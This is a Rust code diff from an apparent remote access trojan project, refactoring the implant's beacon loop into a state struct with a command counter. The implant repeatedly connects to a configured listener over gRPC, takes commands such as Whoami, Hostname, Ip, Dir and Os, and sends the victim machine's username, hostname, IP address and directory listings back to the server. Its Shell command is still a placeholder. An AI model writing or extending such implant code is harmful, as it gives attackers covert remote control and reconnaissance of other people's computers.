@@ -5,7 +5,7 @@ use remote_access_trojan::rat::record_command_result_client::RecordCommandResult
 use std::collections::hash_map::DefaultHasher;
 use std::hash::{Hash, Hasher};
 use std::process::Command;
-use std::thread;
+use std::{mem, thread};
 use std::time::{Duration, SystemTime};
 use tonic::transport::Endpoint;
 
@@ -135,18 +135,30 @@ fn generate_implant_id() -> String {
     format!("{hashed_value:x}")
 }
 
+struct ImplantState {
+    implant_id: String,
+    cadence: Duration,
+    server_location: String,
+    server_port: u16,
+    command_number: u32
+}
+
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
     println!("implant");
 
-    let implant_id = generate_implant_id();
-    let cadence = Duration::from_millis(10000);
-    // Can I send a protobuf from the client to the server?
-    let ip_address = rco_config::LISTENER_IP;
-    let port = rco_config::LISTENER_PORT;
-    let socket = format!("http://{ip_address}:{port}");
+    let mut state = ImplantState {
+        implant_id: generate_implant_id(),
+        cadence: Duration::from_millis(10000),
+        server_location: String::from(rco_config::LISTENER_IP),
+        server_port: rco_config::LISTENER_PORT,
+        command_number: 0
+    };
     
     loop {
+        let location = state.server_location.clone();
+        let port = state.server_port.clone();
+        let socket = format!("http://{location}:{port}");
         let channel = Endpoint::from_shared(socket.clone())?
                         .connect()
                         .await?;
@@ -154,7 +166,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let mut response_client = RecordCommandResultClient::new(channel.clone());
         let request = tonic::Request::new(
             Beacon {
-                last_received: 0
+                requested_command: state.command_number.clone()
             },
         );
         let response = ask_client.send(request).await?.into_inner();
@@ -163,9 +175,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let command = RatCommand::from_i32(response.command).unwrap();
         let result = match command {
             RatCommand::Cadence => {
+                state.command_number += 1;
                 tonic::Request::new(
                     CommandResponse {
-                        implant_id: implant_id.clone(),
+                        implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
                         result: "PLACEHOLDER".to_string()
@@ -173,9 +186,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 )
             },
             RatCommand::Dir => {
+                state.command_number += 1;
                 tonic::Request::new(
                     CommandResponse {
-                        implant_id: implant_id.clone(),
+                        implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
                         result: get_directory_listing()
@@ -183,9 +197,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 )
             },
             RatCommand::Hostname => {
+                state.command_number += 1;
                 tonic::Request::new(
                     CommandResponse {
-                        implant_id: implant_id.clone(),
+                        implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
                         result: get_hostname()
@@ -193,9 +208,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 )
             },
             RatCommand::Ip => {
+                state.command_number += 1;
                 tonic::Request::new(
                     CommandResponse {
-                        implant_id: implant_id.clone(),
+                        implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
                         result: get_ip_address()
@@ -203,19 +219,28 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 )
             },
             RatCommand::Ls => {
+                state.command_number += 1;
                 tonic::Request::new(
                     CommandResponse {
-                        implant_id: implant_id.clone(),
+                        implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
                         result: get_directory_listing()
                     },
                 )
             },
+            RatCommand::None => {
+                mem::drop(channel);
+                mem::drop(ask_client);
+                mem::drop(response_client);
+                thread::sleep(state.cadence);
+                continue
+            },
             RatCommand::Os => {
+                state.command_number += 1;
                 tonic::Request::new(
                     CommandResponse {
-                        implant_id: implant_id.clone(),
+                        implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
                         result: get_operating_system()
@@ -223,12 +248,14 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 )
             },
             RatCommand::Quit => {
+                state.command_number += 1;
                 break
             },
             RatCommand::Shell => {
+                state.command_number += 1;
                 tonic::Request::new(
                     CommandResponse {
-                        implant_id: implant_id.clone(),
+                        implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
                         result: "PLACEHOLDER".to_string()
@@ -236,9 +263,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 )
             },
             RatCommand::Whoami => {
+                state.command_number += 1;
                 tonic::Request::new(
                     CommandResponse {
-                        implant_id: implant_id.clone(),
+                        implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
                         result: get_username()
@@ -246,9 +274,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                 )
             },
             _ => {
+                state.command_number += 1;
                 tonic::Request::new(
                     CommandResponse {
-                        implant_id: implant_id.clone(),
+                        implant_id: state.implant_id.clone(),
                         timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
                         command: response.command,
                         result: "Command received from server not implemented".to_string()
@@ -259,10 +288,10 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let response = response_client.send(result).await?.into_inner();
         println!("{response:?}");
         // By dropping these I can prevent having an always-established channel
-        std::mem::drop(channel);
-        std::mem::drop(ask_client);
-        std::mem::drop(response_client);
-        thread::sleep(cadence);
+        mem::drop(channel);
+        mem::drop(ask_client);
+        mem::drop(response_client);
+        thread::sleep(state.cadence);
     }
 
     Ok(())
